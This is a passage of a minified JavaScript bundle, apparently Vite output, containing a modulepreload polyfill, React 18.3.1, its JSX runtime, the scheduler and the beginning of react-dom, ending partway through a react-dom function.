function pp(t, e) {
    for (var n = 0; n < e.length; n++) {
        const r = e[n];
        if (typeof r != "string" && !Array.isArray(r)) {
            for (const s in r)
                if (s !== "default" && !(s in t)) {
                    const i = Object.getOwnPropertyDescriptor(r, s);
                    i && Object.defineProperty(t, s, i.get ? i : { enumerable: !0, get: () => r[s] });
                }
        }
    }
    return Object.freeze(Object.defineProperty(t, Symbol.toStringTag, { value: "Module" }));
}
(function () {
    const e = document.createElement("link").relList;
    if (e && e.supports && e.supports("modulepreload")) return;
    for (const s of document.querySelectorAll('link[rel="modulepreload"]')) r(s);
    new MutationObserver((s) => {
        for (const i of s)
            if (i.type === "childList")
                for (const o of i.addedNodes) o.tagName === "LINK" && o.rel === "modulepreload" && r(o);
    }).observe(document, { childList: !0, subtree: !0 });
    function n(s) {
        const i = {};
        return (
            s.integrity && (i.integrity = s.integrity),
            s.referrerPolicy && (i.referrerPolicy = s.referrerPolicy),
            s.crossOrigin === "use-credentials"
                ? (i.credentials = "include")
                : s.crossOrigin === "anonymous"
                  ? (i.credentials = "omit")
                  : (i.credentials = "same-origin"),
            i
        );
    }
    function r(s) {
        if (s.ep) return;
        s.ep = !0;
        const i = n(s);
        fetch(s.href, i);
    }
})();
var Ge =
    typeof globalThis < "u"
        ? globalThis
        : typeof window < "u"
          ? window
          : typeof global < "u"
            ? global
            : typeof self < "u"
              ? self
              : {};
function mp(t) {
    return t && t.__esModule && Object.prototype.hasOwnProperty.call(t, "default") ? t.default : t;
}
function gp(t) {
    if (t.__esModule) return t;
    var e = t.default;
    if (typeof e == "function") {
        var n = function r() {
            return this instanceof r ? Reflect.construct(e, arguments, this.constructor) : e.apply(this, arguments);
        };
        n.prototype = e.prototype;
    } else n = {};
    return (
        Object.defineProperty(n, "__esModule", { value: !0 }),
        Object.keys(t).forEach(function (r) {
            var s = Object.getOwnPropertyDescriptor(t, r);
            Object.defineProperty(
                n,
                r,
                s.get
                    ? s
                    : {
                          enumerable: !0,
                          get: function () {
                              return t[r];
                          },
                      }
            );
        }),
        n
    );
}
var sd = { exports: {} },
    Di = {},
    id = { exports: {} },
    L = {};
/**
 * @license React
 * react.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */ var ms = Symbol.for("react.element"),
    vp = Symbol.for("react.portal"),
    yp = Symbol.for("react.fragment"),
    xp = Symbol.for("react.strict_mode"),
    wp = Symbol.for("react.profiler"),
    _p = Symbol.for("react.provider"),
    bp = Symbol.for("react.context"),
    kp = Symbol.for("react.forward_ref"),
    Sp = Symbol.for("react.suspense"),
    jp = Symbol.for("react.memo"),
    Ep = Symbol.for("react.lazy"),
    xu = Symbol.iterator;
function Np(t) {
    return t === null || typeof t != "object"
        ? null
        : ((t = (xu && t[xu]) || t["@@iterator"]), typeof t == "function" ? t : null);
}
var od = {
        isMounted: function () {
            return !1;
        },
        enqueueForceUpdate: function () {},
        enqueueReplaceState: function () {},
        enqueueSetState: function () {},
    },
    ad = Object.assign,
    ld = {};
function hr(t, e, n) {
    (this.props = t), (this.context = e), (this.refs = ld), (this.updater = n || od);
}
hr.prototype.isReactComponent = {};
hr.prototype.setState = function (t, e) {
    if (typeof t != "object" && typeof t != "function" && t != null)
        throw Error(
            "setState(...): takes an object of state variables to update or a function which returns an object of state variables."
        );
    this.updater.enqueueSetState(this, t, e, "setState");
};
hr.prototype.forceUpdate = function (t) {
    this.updater.enqueueForceUpdate(this, t, "forceUpdate");
};
function ud() {}
ud.prototype = hr.prototype;
function dl(t, e, n) {
    (this.props = t), (this.context = e), (this.refs = ld), (this.updater = n || od);
}
var hl = (dl.prototype = new ud());
hl.constructor = dl;
ad(hl, hr.prototype);
hl.isPureReactComponent = !0;
var wu = Array.isArray,
    cd = Object.prototype.hasOwnProperty,
    fl = { current: null },
    dd = { key: !0, ref: !0, __self: !0, __source: !0 };
function hd(t, e, n) {
    var r,
        s = {},
        i = null,
        o = null;
    if (e != null)
        for (r in (e.ref !== void 0 && (o = e.ref), e.key !== void 0 && (i = "" + e.key), e))
            cd.call(e, r) && !dd.hasOwnProperty(r) && (s[r] = e[r]);
    var a = arguments.length - 2;
    if (a === 1) s.children = n;
    else if (1 < a) {
        for (var l = Array(a), c = 0; c < a; c++) l[c] = arguments[c + 2];
        s.children = l;
    }
    if (t && t.defaultProps) for (r in ((a = t.defaultProps), a)) s[r] === void 0 && (s[r] = a[r]);
    return { $$typeof: ms, type: t, key: i, ref: o, props: s, _owner: fl.current };
}
function Cp(t, e) {
    return { $$typeof: ms, type: t.type, key: e, ref: t.ref, props: t.props, _owner: t._owner };
}
function pl(t) {
    return typeof t == "object" && t !== null && t.$$typeof === ms;
}
function Pp(t) {
    var e = { "=": "=0", ":": "=2" };
    return (
        "$" +
        t.replace(/[=:]/g, function (n) {
            return e[n];
        })
    );
}
var _u = /\/+/g;
function vo(t, e) {
    return typeof t == "object" && t !== null && t.key != null ? Pp("" + t.key) : e.toString(36);
}
function Qs(t, e, n, r, s) {
    var i = typeof t;
    (i === "undefined" || i === "boolean") && (t = null);
    var o = !1;
    if (t === null) o = !0;
    else
        switch (i) {
            case "string":
            case "number":
                o = !0;
                break;
            case "object":
                switch (t.$$typeof) {
                    case ms:
                    case vp:
                        o = !0;
                }
        }
    if (o)
        return (
            (o = t),
            (s = s(o)),
            (t = r === "" ? "." + vo(o, 0) : r),
            wu(s)
                ? ((n = ""),
                  t != null && (n = t.replace(_u, "$&/") + "/"),
                  Qs(s, e, n, "", function (c) {
                      return c;
                  }))
                : s != null &&
                  (pl(s) &&
                      (s = Cp(
                          s,
                          n + (!s.key || (o && o.key === s.key) ? "" : ("" + s.key).replace(_u, "$&/") + "/") + t
                      )),
                  e.push(s)),
            1
        );
    if (((o = 0), (r = r === "" ? "." : r + ":"), wu(t)))
        for (var a = 0; a < t.length; a++) {
            i = t[a];
            var l = r + vo(i, a);
            o += Qs(i, e, n, l, s);
        }
    else if (((l = Np(t)), typeof l == "function"))
        for (t = l.call(t), a = 0; !(i = t.next()).done; )
            (i = i.value), (l = r + vo(i, a++)), (o += Qs(i, e, n, l, s));
    else if (i === "object")
        throw (
            ((e = String(t)),
            Error(
                "Objects are not valid as a React child (found: " +
                    (e === "[object Object]" ? "object with keys {" + Object.keys(t).join(", ") + "}" : e) +
                    "). If you meant to render a collection of children, use an array instead."
            ))
        );
    return o;
}
function Ns(t, e, n) {
    if (t == null) return t;
    var r = [],
        s = 0;
    return (
        Qs(t, r, "", "", function (i) {
            return e.call(n, i, s++);
        }),
        r
    );
}
function Tp(t) {
    if (t._status === -1) {
        var e = t._result;
        (e = e()),
            e.then(
                function (n) {
                    (t._status === 0 || t._status === -1) && ((t._status = 1), (t._result = n));
                },
                function (n) {
                    (t._status === 0 || t._status === -1) && ((t._status = 2), (t._result = n));
                }
            ),
            t._status === -1 && ((t._status = 0), (t._result = e));
    }
    if (t._status === 1) return t._result.default;
    throw t._result;
}
var Se = { current: null },
    Js = { transition: null },
    Rp = { ReactCurrentDispatcher: Se, ReactCurrentBatchConfig: Js, ReactCurrentOwner: fl };
function fd() {
    throw Error("act(...) is not supported in production builds of React.");
}
L.Children = {
    map: Ns,
    forEach: function (t, e, n) {
        Ns(
            t,
            function () {
                e.apply(this, arguments);
            },
            n
        );
    },
    count: function (t) {
        var e = 0;
        return (
            Ns(t, function () {
                e++;
            }),
            e
        );
    },
    toArray: function (t) {
        return (
            Ns(t, function (e) {
                return e;
            }) || []
        );
    },
    only: function (t) {
        if (!pl(t)) throw Error("React.Children.only expected to receive a single React element child.");
        return t;
    },
};
L.Component = hr;
L.Fragment = yp;
L.Profiler = wp;
L.PureComponent = dl;
L.StrictMode = xp;
L.Suspense = Sp;
L.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED = Rp;
L.act = fd;
L.cloneElement = function (t, e, n) {
    if (t == null)
        throw Error("React.cloneElement(...): The argument must be a React element, but you passed " + t + ".");
    var r = ad({}, t.props),
        s = t.key,
        i = t.ref,
        o = t._owner;
    if (e != null) {
        if (
            (e.ref !== void 0 && ((i = e.ref), (o = fl.current)),
            e.key !== void 0 && (s = "" + e.key),
            t.type && t.type.defaultProps)
        )
            var a = t.type.defaultProps;
        for (l in e) cd.call(e, l) && !dd.hasOwnProperty(l) && (r[l] = e[l] === void 0 && a !== void 0 ? a[l] : e[l]);
    }
    var l = arguments.length - 2;
    if (l === 1) r.children = n;
    else if (1 < l) {
        a = Array(l);
        for (var c = 0; c < l; c++) a[c] = arguments[c + 2];
        r.children = a;
    }
    return { $$typeof: ms, type: t.type, key: s, ref: i, props: r, _owner: o };
};
L.createContext = function (t) {
    return (
        (t = {
            $$typeof: bp,
            _currentValue: t,
            _currentValue2: t,
            _threadCount: 0,
            Provider: null,
            Consumer: null,
            _defaultValue: null,
            _globalName: null,
        }),
        (t.Provider = { $$typeof: _p, _context: t }),
        (t.Consumer = t)
    );
};
L.createElement = hd;
L.createFactory = function (t) {
    var e = hd.bind(null, t);
    return (e.type = t), e;
};
L.createRef = function () {
    return { current: null };
};
L.forwardRef = function (t) {
    return { $$typeof: kp, render: t };
};
L.isValidElement = pl;
L.lazy = function (t) {
    return { $$typeof: Ep, _payload: { _status: -1, _result: t }, _init: Tp };
};
L.memo = function (t, e) {
    return { $$typeof: jp, type: t, compare: e === void 0 ? null : e };
};
L.startTransition = function (t) {
    var e = Js.transition;
    Js.transition = {};
    try {
        t();
    } finally {
        Js.transition = e;
    }
};
L.unstable_act = fd;
L.useCallback = function (t, e) {
    return Se.current.useCallback(t, e);
};
L.useContext = function (t) {
    return Se.current.useContext(t);
};
L.useDebugValue = function () {};
L.useDeferredValue = function (t) {
    return Se.current.useDeferredValue(t);
};
L.useEffect = function (t, e) {
    return Se.current.useEffect(t, e);
};
L.useId = function () {
    return Se.current.useId();
};
L.useImperativeHandle = function (t, e, n) {
    return Se.current.useImperativeHandle(t, e, n);
};
L.useInsertionEffect = function (t, e) {
    return Se.current.useInsertionEffect(t, e);
};
L.useLayoutEffect = function (t, e) {
    return Se.current.useLayoutEffect(t, e);
};
L.useMemo = function (t, e) {
    return Se.current.useMemo(t, e);
};
L.useReducer = function (t, e, n) {
    return Se.current.useReducer(t, e, n);
};
L.useRef = function (t) {
    return Se.current.useRef(t);
};
L.useState = function (t) {
    return Se.current.useState(t);
};
L.useSyncExternalStore = function (t, e, n) {
    return Se.current.useSyncExternalStore(t, e, n);
};
L.useTransition = function () {
    return Se.current.useTransition();
};
L.version = "18.3.1";
id.exports = L;
var x = id.exports;
const Op = mp(x),
    $p = pp({ __proto__: null, default: Op }, [x]);
/**
 * @license React
 * react-jsx-runtime.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */ var Ip = x,
    Ap = Symbol.for("react.element"),
    Lp = Symbol.for("react.fragment"),
    Mp = Object.prototype.hasOwnProperty,
    Up = Ip.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED.ReactCurrentOwner,
    Dp = { key: !0, ref: !0, __self: !0, __source: !0 };
function pd(t, e, n) {
    var r,
        s = {},
        i = null,
        o = null;
    n !== void 0 && (i = "" + n), e.key !== void 0 && (i = "" + e.key), e.ref !== void 0 && (o = e.ref);
    for (r in e) Mp.call(e, r) && !Dp.hasOwnProperty(r) && (s[r] = e[r]);
    if (t && t.defaultProps) for (r in ((e = t.defaultProps), e)) s[r] === void 0 && (s[r] = e[r]);
    return { $$typeof: Ap, type: t, key: i, ref: o, props: s, _owner: Up.current };
}
Di.Fragment = Lp;
Di.jsx = pd;
Di.jsxs = pd;
sd.exports = Di;
var u = sd.exports,
    md = { exports: {} },
    Ue = {},
    gd = { exports: {} },
    vd = {};
/**
 * @license React
 * scheduler.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */ (function (t) {
    function e(C, T) {
        var R = C.length;
        C.push(T);
        e: for (; 0 < R; ) {
            var z = (R - 1) >>> 1,
                W = C[z];
            if (0 < s(W, T)) (C[z] = T), (C[R] = W), (R = z);
            else break e;
        }
    }
    function n(C) {
        return C.length === 0 ? null : C[0];
    }
    function r(C) {
        if (C.length === 0) return null;
        var T = C[0],
            R = C.pop();
        if (R !== T) {
            C[0] = R;
            e: for (var z = 0, W = C.length, Pt = W >>> 1; z < Pt; ) {
                var G = 2 * (z + 1) - 1,
                    we = C[G],
                    $e = G + 1,
                    at = C[$e];
                if (0 > s(we, R))
                    $e < W && 0 > s(at, we) ? ((C[z] = at), (C[$e] = R), (z = $e)) : ((C[z] = we), (C[G] = R), (z = G));
                else if ($e < W && 0 > s(at, R)) (C[z] = at), (C[$e] = R), (z = $e);
                else break e;
            }
        }
        return T;
    }
    function s(C, T) {
        var R = C.sortIndex - T.sortIndex;
        return R !== 0 ? R : C.id - T.id;
    }
    if (typeof performance == "object" && typeof performance.now == "function") {
        var i = performance;
        t.unstable_now = function () {
            return i.now();
        };
    } else {
        var o = Date,
            a = o.now();
        t.unstable_now = function () {
            return o.now() - a;
        };
    }
    var l = [],
        c = [],
        d = 1,
        h = null,
        f = 3,
        v = !1,
        y = !1,
        _ = !1,
        b = typeof setTimeout == "function" ? setTimeout : null,
        g = typeof clearTimeout == "function" ? clearTimeout : null,
        p = typeof setImmediate < "u" ? setImmediate : null;
    typeof navigator < "u" &&
        navigator.scheduling !== void 0 &&
        navigator.scheduling.isInputPending !== void 0 &&
        navigator.scheduling.isInputPending.bind(navigator.scheduling);
    function m(C) {
        for (var T = n(c); T !== null; ) {
            if (T.callback === null) r(c);
            else if (T.startTime <= C) r(c), (T.sortIndex = T.expirationTime), e(l, T);
            else break;
            T = n(c);
        }
    }
    function w(C) {
        if (((_ = !1), m(C), !y))
            if (n(l) !== null) (y = !0), Ct(k);
            else {
                var T = n(c);
                T !== null && ot(w, T.startTime - C);
            }
    }
    function k(C, T) {
        (y = !1), _ && ((_ = !1), g(E), (E = -1)), (v = !0);
        var R = f;
        try {
            for (m(T), h = n(l); h !== null && (!(h.expirationTime > T) || (C && !fe())); ) {
                var z = h.callback;
                if (typeof z == "function") {
                    (h.callback = null), (f = h.priorityLevel);
                    var W = z(h.expirationTime <= T);
                    (T = t.unstable_now()), typeof W == "function" ? (h.callback = W) : h === n(l) && r(l), m(T);
                } else r(l);
                h = n(l);
            }
            if (h !== null) var Pt = !0;
            else {
                var G = n(c);
                G !== null && ot(w, G.startTime - T), (Pt = !1);
            }
            return Pt;
        } finally {
            (h = null), (f = R), (v = !1);
        }
    }
    var j = !1,
        N = null,
        E = -1,
        U = 5,
        I = -1;
    function fe() {
        return !(t.unstable_now() - I < U);
    }
    function it() {
        if (N !== null) {
            var C = t.unstable_now();
            I = C;
            var T = !0;
            try {
                T = N(!0, C);
            } finally {
                T ? ze() : ((j = !1), (N = null));
            }
        } else j = !1;
    }
    var ze;
    if (typeof p == "function")
        ze = function () {
            p(it);
        };
    else if (typeof MessageChannel < "u") {
        var pe = new MessageChannel(),
            pt = pe.port2;
        (pe.port1.onmessage = it),
            (ze = function () {
                pt.postMessage(null);
            });
    } else
        ze = function () {
            b(it, 0);
        };
    function Ct(C) {
        (N = C), j || ((j = !0), ze());
    }
    function ot(C, T) {
        E = b(function () {
            C(t.unstable_now());
        }, T);
    }
    (t.unstable_IdlePriority = 5),
        (t.unstable_ImmediatePriority = 1),
        (t.unstable_LowPriority = 4),
        (t.unstable_NormalPriority = 3),
        (t.unstable_Profiling = null),
        (t.unstable_UserBlockingPriority = 2),
        (t.unstable_cancelCallback = function (C) {
            C.callback = null;
        }),
        (t.unstable_continueExecution = function () {
            y || v || ((y = !0), Ct(k));
        }),
        (t.unstable_forceFrameRate = function (C) {
            0 > C || 125 < C
                ? console.error(
                      "forceFrameRate takes a positive int between 0 and 125, forcing frame rates higher than 125 fps is not supported"
                  )
                : (U = 0 < C ? Math.floor(1e3 / C) : 5);
        }),
        (t.unstable_getCurrentPriorityLevel = function () {
            return f;
        }),
        (t.unstable_getFirstCallbackNode = function () {
            return n(l);
        }),
        (t.unstable_next = function (C) {
            switch (f) {
                case 1:
                case 2:
                case 3:
                    var T = 3;
                    break;
                default:
                    T = f;
            }
            var R = f;
            f = T;
            try {
                return C();
            } finally {
                f = R;
            }
        }),
        (t.unstable_pauseExecution = function () {}),
        (t.unstable_requestPaint = function () {}),
        (t.unstable_runWithPriority = function (C, T) {
            switch (C) {
                case 1:
                case 2:
                case 3:
                case 4:
                case 5:
                    break;
                default:
                    C = 3;
            }
            var R = f;
            f = C;
            try {
                return T();
            } finally {
                f = R;
            }
        }),
        (t.unstable_scheduleCallback = function (C, T, R) {
            var z = t.unstable_now();
            switch (
                (typeof R == "object" && R !== null
                    ? ((R = R.delay), (R = typeof R == "number" && 0 < R ? z + R : z))
                    : (R = z),
                C)
            ) {
                case 1:
                    var W = -1;
                    break;
                case 2:
                    W = 250;
                    break;
                case 5:
                    W = 1073741823;
                    break;
                case 4:
                    W = 1e4;
                    break;
                default:
                    W = 5e3;
            }
            return (
                (W = R + W),
                (C = { id: d++, callback: T, priorityLevel: C, startTime: R, expirationTime: W, sortIndex: -1 }),
                R > z
                    ? ((C.sortIndex = R),
                      e(c, C),
                      n(l) === null && C === n(c) && (_ ? (g(E), (E = -1)) : (_ = !0), ot(w, R - z)))
                    : ((C.sortIndex = W), e(l, C), y || v || ((y = !0), Ct(k))),
                C
            );
        }),
        (t.unstable_shouldYield = fe),
        (t.unstable_wrapCallback = function (C) {
            var T = f;
            return function () {
                var R = f;
                f = T;
                try {
                    return C.apply(this, arguments);
                } finally {
                    f = R;
                }
            };
        });
})(vd);
gd.exports = vd;
var zp = gd.exports;
/**
 * @license React
 * react-dom.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */ var Fp = x,
    Me = zp;
function S(t) {
    for (var e = "https://reactjs.org/docs/error-decoder.html?invariant=" + t, n = 1; n < arguments.length; n++)
        e += "&args[]=" + encodeURIComponent(arguments[n]);
    return (
        "Minified React error #" +
        t +
        "; visit " +
        e +
        " for the full message or use the non-minified dev environment for full errors and additional helpful warnings."
    );
}
var yd = new Set(),
    Qr = {};
function En(t, e) {
    sr(t, e), sr(t + "Capture", e);
}
function sr(t, e) {
    for (Qr[t] = e, t = 0; t < e.length; t++) yd.add(e[t]);
}
var bt = !(typeof window > "u" || typeof window.document > "u" || typeof window.document.createElement > "u"),
    sa = Object.prototype.hasOwnProperty,
    Bp =
        /^[:A-Z_a-z\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD][:A-Z_a-z\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD\-.0-9\u00B7\u0300-\u036F\u203F-\u2040]*$/,
    bu = {},
    ku = {};
function Vp(t) {
    return sa.call(ku, t) ? !0 : sa.call(bu, t) ? !1 : Bp.test(t) ? (ku[t] = !0) : ((bu[t] = !0), !1);
}
function Wp(t, e, n, r) {
    if (n !== null && n.type === 0) return !1;
    switch (typeof e) {
        case "function":
        case "symbol":
            return !0;
        case "boolean":
            return r
                ? !1
                : n !== null
                  ? !n.acceptsBooleans
                  : ((t = t.toLowerCase().slice(0, 5)), t !== "data-" && t !== "aria-");
        default:
            return !1;
    }
}
function Hp(t, e, n, r) {
    if (e === null || typeof e > "u" || Wp(t, e, n, r)) return !0;
    if (r) return !1;
    if (n !== null)
        switch (n.type) {
            case 3:
                return !e;
            case 4:
                return e === !1;
            case 5:
                return isNaN(e);
            case 6:
                return isNaN(e) || 1 > e;
        }
    return !1;
}
function je(t, e, n, r, s, i, o) {
    (this.acceptsBooleans = e === 2 || e === 3 || e === 4),
        (this.attributeName = r),
        (this.attributeNamespace = s),
        (this.mustUseProperty = n),
        (this.propertyName = t),
        (this.type = e),
        (this.sanitizeURL = i),
        (this.removeEmptyString = o);
}
var de = {};
"children dangerouslySetInnerHTML defaultValue defaultChecked innerHTML suppressContentEditableWarning suppressHydrationWarning style"
    .split(" ")
    .forEach(function (t) {
        de[t] = new je(t, 0, !1, t, null, !1, !1);
    });
[
    ["acceptCharset", "accept-charset"],
    ["className", "class"],
    ["htmlFor", "for"],
    ["httpEquiv", "http-equiv"],
].forEach(function (t) {
    var e = t[0];
    de[e] = new je(e, 1, !1, t[1], null, !1, !1);
});
["contentEditable", "draggable", "spellCheck", "value"].forEach(function (t) {
    de[t] = new je(t, 2, !1, t.toLowerCase(), null, !1, !1);
});
["autoReverse", "externalResourcesRequired", "focusable", "preserveAlpha"].forEach(function (t) {
    de[t] = new je(t, 2, !1, t, null, !1, !1);
});
"allowFullScreen async autoFocus autoPlay controls default defer disabled disablePictureInPicture disableRemotePlayback formNoValidate hidden loop noModule noValidate open playsInline readOnly required reversed scoped seamless itemScope"
    .split(" ")
    .forEach(function (t) {
        de[t] = new je(t, 3, !1, t.toLowerCase(), null, !1, !1);
    });
["checked", "multiple", "muted", "selected"].forEach(function (t) {
    de[t] = new je(t, 3, !0, t, null, !1, !1);
});
["capture", "download"].forEach(function (t) {
    de[t] = new je(t, 4, !1, t, null, !1, !1);
});
["cols", "rows", "size", "span"].forEach(function (t) {
    de[t] = new je(t, 6, !1, t, null, !1, !1);
});
["rowSpan", "start"].forEach(function (t) {
    de[t] = new je(t, 5, !1, t.toLowerCase(), null, !1, !1);
});
var ml = /[\-:]([a-z])/g;
function gl(t) {
    return t[1].toUpperCase();
}
"accent-height alignment-baseline arabic-form baseline-shift cap-height clip-path clip-rule color-interpolation color-interpolation-filters color-profile color-rendering dominant-baseline enable-background fill-opacity fill-rule flood-color flood-opacity font-family font-size font-size-adjust font-stretch font-style font-variant font-weight glyph-name glyph-orientation-horizontal glyph-orientation-vertical horiz-adv-x horiz-origin-x image-rendering letter-spacing lighting-color marker-end marker-mid marker-start overline-position overline-thickness paint-order panose-1 pointer-events rendering-intent shape-rendering stop-color stop-opacity strikethrough-position strikethrough-thickness stroke-dasharray stroke-dashoffset stroke-linecap stroke-linejoin stroke-miterlimit stroke-opacity stroke-width text-anchor text-decoration text-rendering underline-position underline-thickness unicode-bidi unicode-range units-per-em v-alphabetic v-hanging v-ideographic v-mathematical vector-effect vert-adv-y vert-origin-x vert-origin-y word-spacing writing-mode xmlns:xlink x-height"
    .split(" ")
    .forEach(function (t) {
        var e = t.replace(ml, gl);
        de[e] = new je(e, 1, !1, t, null, !1, !1);
    });
"xlink:actuate xlink:arcrole xlink:role xlink:show xlink:title xlink:type".split(" ").forEach(function (t) {
    var e = t.replace(ml, gl);
    de[e] = new je(e, 1, !1, t, "http://www.w3.org/1999/xlink", !1, !1);
});
["xml:base", "xml:lang", "xml:space"].forEach(function (t) {
    var e = t.replace(ml, gl);
    de[e] = new je(e, 1, !1, t, "http://www.w3.org/XML/1998/namespace", !1, !1);
});
["tabIndex", "crossOrigin"].forEach(function (t) {
    de[t] = new je(t, 1, !1, t.toLowerCase(), null, !1, !1);
});
de.xlinkHref = new je("xlinkHref", 1, !1, "xlink:href", "http://www.w3.org/1999/xlink", !0, !1);
["src", "href", "action", "formAction"].forEach(function (t) {
    de[t] = new je(t, 1, !1, t.toLowerCase(), null, !0, !0);
});
function vl(t, e, n, r) {
    var s = de.hasOwnProperty(e) ? de[e] : null;
    (s !== null
        ? s.type !== 0
        : r || !(2 < e.length) || (e[0] !== "o" && e[0] !== "O") || (e[1] !== "n" && e[1] !== "N")) &&
        (Hp(e, n, s, r) && (n = null),
        r || s === null
            ? Vp(e) && (n === null ? t.removeAttribute(e) : t.setAttribute(e, "" + n))
            : s.mustUseProperty
              ? (t[s.propertyName] = n === null ? (s.type === 3 ? !1 : "") : n)
              : ((e = s.attributeName),
                (r = s.attributeNamespace),
                n === null
                    ? t.removeAttribute(e)
                    : ((s = s.type),
                      (n = s === 3 || (s === 4 && n === !0) ? "" : "" + n),
                      r ? t.setAttributeNS(r, e, n) : t.setAttribute(e, n))));
}
var Et = Fp.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED,
    Cs = Symbol.for("react.element"),
    Dn = Symbol.for("react.portal"),
    zn = Symbol.for("react.fragment"),
    yl = Symbol.for("react.strict_mode"),
    ia = Symbol.for("react.profiler"),
    xd = Symbol.for("react.provider"),
    wd = Symbol.for("react.context"),
    xl = Symbol.for("react.forward_ref"),
    oa = Symbol.for("react.suspense"),
    aa = Symbol.for("react.suspense_list"),
    wl = Symbol.for("react.memo"),
    It = Symbol.for("react.lazy"),
    _d = Symbol.for("react.offscreen"),
    Su = Symbol.iterator;
function _r(t) {
    return t === null || typeof t != "object"
        ? null
        : ((t = (Su && t[Su]) || t["@@iterator"]), typeof t == "function" ? t : null);
}
var X = Object.assign,
    yo;
function Rr(t) {
    if (yo === void 0)
        try {
            throw Error();
        } catch (n) {
            var e = n.stack.trim().match(/\n( *(at )?)/);
            yo = (e && e[1]) || "";
        }
    return (
        `
` +
        yo +
        t
    );
}
var xo = !1;
function wo(t, e) {
    if (!t || xo) return "";
    xo = !0;
    var n = Error.prepareStackTrace;
    Error.prepareStackTrace = void 0;
    try {
        if (e)
            if (
                ((e = function () {
                    throw Error();
                }),
                Object.defineProperty(e.prototype, "props", {
                    set: function () {
                        throw Error();
                    },
                }),
                typeof Reflect == "object" && Reflect.construct)
            ) {
                try {
                    Reflect.construct(e, []);
                } catch (c) {
                    var r = c;
                }
                Reflect.construct(t, [], e);
            } else {
                try {
                    e.call();
                } catch (c) {
                    r = c;
                }
                t.call(e.prototype);
            }
        else {
            try {
                throw Error();
            } catch (c) {
                r = c;
            }
            t();
        }
    } catch (c) {
        if (c && r && typeof c.stack == "string") {
            for (
                var s = c.stack.split(`
`),
                    i = r.stack.split(`
`),
                    o = s.length - 1,
                    a = i.length - 1;
                1 <= o && 0 <= a && s[o] !== i[a];

            )
                a--;
            for (; 1 <= o && 0 <= a; o--, a--)
                if (s[o] !== i[a]) {
                    if (o !== 1 || a !== 1)
                        do
                            if ((o--, a--, 0 > a || s[o] !== i[a])) {
                                var l =
                                    `
` + s[o].replace(" at new ", " at ");
                                return (
                                    t.displayName &&
                                        l.includes("<anonymous>") &&
                                        (l = l.replace("<anonymous>", t.displayName)),
                                    l
                                );
                            }
                        while (1 <= o && 0 <= a);
                    break;
                }
        }
    } finally {
        (xo = !1), (Error.prepareStackTrace = n);
    }
    return (t = t ? t.displayName || t.name : "") ? Rr(t) : "";
}
function qp(t) {
    switch (t.tag) {
        case 5:
            return Rr(t.type);
        case 16:
            return Rr("Lazy");
        case 13:
            return Rr("Suspense");
        case 19:
            return Rr("SuspenseList");
        case 0:
        case 2:
        case 15:
            return (t = wo(t.type, !1)), t;
        case 11:
            return (t = wo(t.type.render, !1)), t;
        case 1:
            return (t = wo(t.type, !0)), t;
        default:
            return "";
    }
}
function la(t) {
    if (t == null) return null;
    if (typeof t == "function") return t.displayName || t.name || null;
    if (typeof t == "string") return t;
    switch (t) {
        case zn:
            return "Fragment";
        case Dn:
            return "Portal";
        case ia:
            return "Profiler";
        case yl:
            return "StrictMode";
        case oa:
            return "Suspense";
        case aa:
            return "SuspenseList";
    }
    if (typeof t == "object")
        switch (t.$$typeof) {
            case wd:
                return (t.displayName || "Context") + ".Consumer";
            case xd:
                return (t._context.displayName || "Context") + ".Provider";
            case xl:
                var e = t.render;
                return (
                    (t = t.displayName),
                    t || ((t = e.displayName || e.name || ""), (t = t !== "" ? "ForwardRef(" + t + ")" : "ForwardRef")),
                    t
                );
            case wl:
                return (e = t.displayName || null), e !== null ? e : la(t.type) || "Memo";
            case It:
                (e = t._payload), (t = t._init);
                try {
                    return la(t(e));
                } catch {}
        }
    return null;
}
function Gp(t) {
    var e = t.type;
    switch (t.tag) {
        case 24:
            return "Cache";
        case 9:
            return (e.displayName || "Context") + ".Consumer";
        case 10:
            return (e._context.displayName || "Context") + ".Provider";
        case 18:
            return "DehydratedFragment";
        case 11:
            return (
                (t = e.render),
                (t = t.displayName || t.name || ""),
                e.displayName || (t !== "" ? "ForwardRef(" + t + ")" : "ForwardRef")
            );
        case 7:
            return "Fragment";
        case 5:
            return e;
        case 4:
            return "Portal";
        case 3:
            return "Root";
        case 6:
            return "Text";
        case 16:
            return la(e);
        case 8:
            return e === yl ? "StrictMode" : "Mode";
        case 22:
            return "Offscreen";
        case 12:
            return "Profiler";
        case 21:
            return "Scope";
        case 13:
            return "Suspense";
        case 19:
            return "SuspenseList";
        case 25:
            return "TracingMarker";
        case 1:
        case 0:
        case 17:
        case 2:
        case 14:
        case 15:
            if (typeof e == "function") return e.displayName || e.name || null;
            if (typeof e == "string") return e;
    }
    return null;
}
function Xt(t) {
    switch (typeof t) {
        case "boolean":
        case "number":
        case "string":
        case "undefined":
            return t;
        case "object":
            return t;
        default:
            return "";
    }
}
function bd(t) {
    var e = t.type;
    return (t = t.nodeName) && t.toLowerCase() === "input" && (e === "checkbox" || e === "radio");
}
function Kp(t) {
    var e = bd(t) ? "checked" : "value",
        n = Object.getOwnPropertyDescriptor(t.constructor.prototype, e),
        r = "" + t[e];
    if (!t.hasOwnProperty(e) && typeof n < "u" && typeof n.get == "function" && typeof n.set == "function") {
        var s = n.get,
            i = n.set;
        return (
            Object.defineProperty(t, e, {
                configurable: !0,
